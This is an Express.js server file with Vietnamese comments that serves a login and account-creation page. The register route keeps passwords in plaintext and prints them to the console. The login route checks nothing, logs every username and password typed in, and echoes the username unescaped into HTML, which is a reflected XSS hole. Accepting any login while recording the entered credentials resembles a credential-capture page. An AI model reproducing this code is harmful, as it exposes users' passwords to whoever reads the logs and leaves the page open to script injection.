const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Danh sách lưu trữ tài khoản trên máy chủ
const users = [];

// Giao diện Trang Đăng Nhập & Tạo Tài Khoản
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="vi">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Hệ Thống Tài Khoản</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
        <div class="bg-slate-900 border border-slate-800 p-8 rounded-2xl w-full max-w-md shadow-2xl">
            <div class="grid grid-cols-2 gap-2 bg-slate-950 p-1 rounded-xl mb-6">
                <button onclick="showTab('login')" id="btnLogin" class="py-2 rounded-lg bg-indigo-600 font-bold text-sm">Đăng Nhập</button>
                <button onclick="showTab('register')" id="btnReg" class="py-2 rounded-lg text-slate-400 font-bold text-sm">Tạo Tài Khoản</button>
            </div>

            <!-- Form Đăng Nhập -->
            <form id="formLogin" action="/login" method="POST" class="space-y-4">
                <h2 class="text-xl font-bold text-center">Đăng Nhập Hệ Thống</h2>
                <input type="text" name="username" required placeholder="Tên tài khoản" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-sm">
                <input type="password" name="password" required placeholder="Mật khẩu" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-sm">
                <button type="submit" class="w-full bg-indigo-600 hover:bg-indigo-500 py-3 rounded-xl font-semibold text-sm">Đăng Nhập</button>
            </form>

            <!-- Form Tạo Tài Khoản -->
            <form id="formReg" action="/register" method="POST" class="space-y-4 hidden">
                <h2 class="text-xl font-bold text-center">Tạo Tài Khoản Mới</h2>
                <input type="text" name="fullname" required placeholder="Họ và tên" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-sm">
                <input type="text" name="username" required placeholder="Tên tài khoản muốn tạo" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-sm">
                <input type="password" name="password" required placeholder="Mật khẩu" class="w-full bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 text-sm">
                <button type="submit" class="w-full bg-purple-600 hover:bg-purple-500 py-3 rounded-xl font-semibold text-sm">Hoàn Tất Đăng Ký</button>
            </form>
        </div>
        <script>
            function showTab(tab) {
                const isLogin = tab === 'login';
                document.getElementById('formLogin').classList.toggle('hidden', !isLogin);
                document.getElementById('formReg').classList.toggle('hidden', isLogin);
                document.getElementById('btnLogin').className = isLogin ? 'py-2 rounded-lg bg-indigo-600 font-bold text-sm' : 'py-2 rounded-lg text-slate-400 font-bold text-sm';
                document.getElementById('btnReg').className = !isLogin ? 'py-2 rounded-lg bg-purple-600 font-bold text-sm' : 'py-2 rounded-lg text-slate-400 font-bold text-sm';
            }
        </script>
    </body>
    </html>
    `);
});

// Xử lý khi người dùng Tạo Tài Khoản
app.post('/register', (req, res) => {
    const { fullname, username, password } = req.body;
    users.push({ fullname, username, password });

    console.log("=========================================");
    console.log("🆕 [ĐĂNG KÝ MỚI] Có người vừa tạo tài khoản:");
    console.log("👤 Họ tên:", fullname);
    console.log("🏷️ Tài khoản:", username);
    console.log("🔑 Mật khẩu:", password);
    console.log("=========================================");

    res.send(`<h2 style="font-family:sans-serif;text-align:center;margin-top:50px;">✅ Tạo tài khoản thành công! <a href="/">Bấm vào đây để Đăng nhập</a></h2>`);
});

// Xử lý khi người dùng Đăng Nhập
app.post('/login', (req, res) => {
    const { username, password } = req.body;

    console.log("-----------------------------------------");
    console.log("🔥 [ĐĂNG NHẬP] Thông tin người dùng nhập:");
    console.log("👤 Tài khoản:", username);
    console.log("🔑 Mật khẩu:", password);
    console.log("-----------------------------------------");

    res.send(`<h2 style="font-family:sans-serif;text-align:center;margin-top:50px;">🎉 Chào mừng ${username} đã đăng nhập! <a href="/">Quay lại</a></h2>`);
});

app.listen(PORT, () => console.log("Server running on port " + PORT));
